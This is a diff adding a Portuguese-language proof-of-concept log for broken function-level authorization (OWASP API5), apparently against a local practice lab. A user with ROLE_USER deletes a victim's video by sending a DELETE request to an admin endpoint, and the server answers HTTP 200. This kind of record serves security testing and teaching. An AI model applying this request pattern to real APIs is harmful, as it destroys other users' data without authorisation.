@@ -1,0 +1,13 @@
+# BFLA (API5) — usuário comum executa função de admin
+# 1) a vítima faz upload de um vídeo:
+{"id":7,"video_name":"tmp.ZXCgTL2n1U","conversion_params":"-v codec h264","profileVideo":"data:image/jpeg;base64,RkFLRVZJREVPQ09OVEVOVDEyMzQ1Njc4OTA="}
+# video id da vítima: 7
+----------------------------------------------------------------
+# 2) role do atacante:
+"role":"ROLE_USER"
+# 3) atacante (ROLE_USER) deleta o vídeo da vítima via endpoint de ADMIN:
+DELETE http://localhost:8888/identity/api/v2/admin/videos/7
+{"message":"User video deleted successfully.","status":200}
+[HTTP 200]
+----------------------------------------------------------------
+# Prova: função administrativa executada com token de usuário comum.
